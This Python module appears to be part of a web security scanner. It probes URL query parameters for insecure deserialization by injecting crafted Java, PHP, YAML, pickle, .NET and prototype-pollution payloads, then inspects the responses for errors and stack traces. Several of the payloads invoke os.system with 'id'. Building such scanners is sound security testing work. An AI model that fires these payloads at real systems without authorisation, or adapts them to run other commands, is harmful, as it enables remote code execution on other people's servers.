"""Deserialization probe."""

from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from src.analysis.helpers import classify_endpoint, endpoint_base_key, endpoint_signature
from src.analysis.passive.runtime import ResponseCache
from src.recon.common import normalize_url

from ._confidence import probe_confidence, probe_severity
from ._patterns import CLASS_NAME_RE, DESER_ERROR_RE, ERROR_STACK_TRACE_RE


def deserialization_probe(
    priority_urls: list[dict[str, Any]],
    response_cache: ResponseCache,
    limit: int = 8,
) -> list[dict[str, Any]]:
    """Send crafted serialized objects to parameters that look like serialized data.

    Tests Java serialized, Python pickle, PHP serialized, and YAML payloads.
    Checks for error messages mentioning deserialization, class names, and
    stack traces.

    Args:
        priority_urls: List of URL dicts with endpoint metadata.
        response_cache: Response cache for making requests.
        limit: Maximum number of findings to return.

    Returns:
        List of deserialization findings.
    """
    findings: list[dict[str, Any]] = []
    seen: set[str] = set()

    serial_param_names = {
        "token",
        "session",
        "state",
        "object",
        "data",
        "payload",
        "serialized",
        "config",
        "settings",
        "obj",
        "value",
        "input",
        "content",
        "store",
        "cache",
        "cookie",
        "auth",
        "profile",
        "user_data",
        "params",
        "options",
        "attributes",
    }

    java_serialized = (
        b"\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07"
        b"\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\t"
        b"thresholdxp?@\x00\x00\x00\x00\x00\x00w\x08\x00\x00\x00\x10"
        b"\x00\x00\x00\x00x"
    )

    deserialization_payloads = [
        ("php_serialized", 'O:8:"stdClass":1:{s:4:"test";s:4:"evil";}'),
        ("yaml_exploit", "!!python/object/apply:os.system ['id']"),
        ("yaml_generic", "!!ruby/object:Gem::Installer\n  i: x"),
        ("java_serialized", java_serialized.decode("latin-1")),
        ("python_pickle", "cos\nsystem\n(S'id'\ntR."),
        ("dotnet_serialized", "/wEy0xUAAAAAAAD////8AgAAAApTeXN0ZW0uVHlwZQ=="),
        ("nodejs_proto", '{"__proto__":{"polluted":"yes"}}'),
        (
            "java_rce",
            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFGADAAF"
            "GAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAADHcIAAAAEAAAAAA"
            "AAAB4",
        ),
    ]

    for url_entry in priority_urls:
        if len(findings) >= limit:
            break
        url = str(url_entry.get("url", "") if isinstance(url_entry, dict) else url_entry).strip()
        if not url:
            continue

        parsed = urlparse(url)
        query_pairs = parse_qsl(parsed.query, keep_blank_values=True)
        if not query_pairs:
            continue

        serial_params = [
            (i, k, v) for i, (k, v) in enumerate(query_pairs) if k.lower() in serial_param_names
        ]
        if not serial_params:
            continue

        endpoint_key = endpoint_signature(url)
        if endpoint_key in seen:
            continue
        seen.add(endpoint_key)

        if classify_endpoint(url) == "STATIC":
            continue

        url_issues: list[str] = []
        url_probes: list[dict[str, Any]] = []

        for idx, param_name, _param_value in serial_params:
            if len(url_probes) >= 2:
                break
            for payload_name, payload_value in deserialization_payloads:
                updated = list(query_pairs)
                updated[idx] = (param_name, payload_value)
                test_url = normalize_url(
                    urlunparse(parsed._replace(query=urlencode(updated, doseq=True)))
                )

                response = response_cache.request(
                    test_url,
                    headers={
                        "Cache-Control": "no-cache",
                        "X-Deser-Probe": "1",
                    },
                )
                if not response:
                    continue

                body = str(response.get("body_text", "") or "")[:8000]
                status = int(response.get("status_code") or 0)

                issues_for_hit: list[str] = []

                if DESER_ERROR_RE.search(body):
                    issues_for_hit.append("deserialization_error")
                elif CLASS_NAME_RE.search(body):
                    issues_for_hit.append("deserialization_class_reflection")
                elif ERROR_STACK_TRACE_RE.search(body):
                    issues_for_hit.append("deserialization_stack_trace")
                elif status == 500 and len(body) > 50:
                    issues_for_hit.append("deserialization_error")

                if issues_for_hit:
                    url_issues.extend(issues_for_hit)
                    url_probes.append(
                        {
                            "parameter": param_name,
                            "payload_type": payload_name,
                            "status_code": status,
                            "issues": issues_for_hit,
                        }
                    )
                    break

        if url_probes:
            findings.append(
                {
                    "url": url,
                    "endpoint_key": endpoint_key,
                    "endpoint_base_key": endpoint_base_key(url),
                    "endpoint_type": classify_endpoint(url),
                    "issues": url_issues,
                    "probes": url_probes,
                    "confidence": probe_confidence(url_issues),
                    "severity": probe_severity(url_issues),
                }
            )

    findings.sort(key=lambda item: (-item["confidence"], item["url"]))
    return findings[:limit]
